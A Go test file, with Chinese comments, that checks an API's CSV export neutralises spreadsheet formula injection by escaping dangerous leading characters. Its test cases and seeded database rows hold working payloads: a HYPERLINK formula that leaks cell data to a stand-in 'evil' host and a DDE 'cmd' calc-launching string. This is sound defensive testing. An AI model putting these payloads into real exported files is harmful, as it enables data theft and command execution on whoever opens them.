package api

import (
	"net/http"
	"strings"
	"testing"
)

// F3：正常值保持原样（既有导出契约不变），危险值才转义与中和。
func TestAppendCSVField(t *testing.T) {
	cases := []struct{ in, want string }{
		{"2023-11-14", "2023-11-14"},
		{"node:1", "node:1"},
		{"system", "system"},
		{"", ""},
		{"=2+2", `"'=2+2"`},
		{"+1", `"'+1"`},
		{"-1", `"'-1"`},
		{"@SUM(A1)", `"'@SUM(A1)"`},
		{`=HYPERLINK("http://evil/?x="&A1,"click")`, `"'=HYPERLINK(""http://evil/?x=""&A1,""click"")"`},
		{"=cmd|' /C calc'!A0", `"'=cmd|' /C calc'!A0"`},
		{"a,b", `"a,b"`},
		{"a\"b", `"a""b"`},
		{"a\nb", `"a b"`},
		{"a\r\nb", `"a  b"`},
		{"\n=1", `"' =1"`},
	}
	for _, tc := range cases {
		got := string(appendCSVField(nil, tc.in))
		if got != tc.want {
			t.Errorf("appendCSVField(%q) = %q, want %q", tc.in, got, tc.want)
		}
	}
}

// 端到端复现 PoC：往 daily 表写入公式payload，导出的 CSV 不得再含裸公式。
func TestExportCSVNeutralizesFormulaInjection(t *testing.T) {
	ts, db, _ := newTestServer(t, "", &fakeSource{hasConns: true}, "")
	for _, q := range []string{
		`INSERT INTO daily(day,scope,rx,tx,rx_pkts,tx_pkts) VALUES('2026-11-05','=HYPERLINK("http://evil/?x="&A1,"click")',1,2,3,4)`,
		`INSERT INTO daily(day,scope,rx,tx,rx_pkts,tx_pkts) VALUES('2026-11-05','=cmd|'' /C calc''!A0',1,2,3,4)`,
		`INSERT INTO daily(day,scope,rx,tx,rx_pkts,tx_pkts) VALUES('=2+2','node:1',1,2,3,4)`,
	} {
		if _, err := db.Exec(q); err != nil {
			t.Fatal(err)
		}
	}
	resp := doReq(t, ts, http.MethodGet, "/api/export", nil)
	got := body(t, resp)

	if !strings.HasPrefix(got, "day,scope,rx_bytes,tx_bytes,rx_pkts,tx_pkts\n") {
		t.Fatalf("表头格式被改变:\n%s", got)
	}
	for _, naked := range []string{",=HYPERLINK", ",=cmd|", "\n=2+2,", ",=2+2"} {
		if strings.Contains(got, naked) {
			t.Errorf("导出仍含裸公式 %q:\n%s", naked, got)
		}
	}
	for _, neutralized := range []string{`"'=HYPERLINK`, `"'=cmd|`, `"'=2+2"`} {
		if !strings.Contains(got, neutralized) {
			t.Errorf("导出未中和公式（缺少 %q）:\n%s", neutralized, got)
		}
	}
}
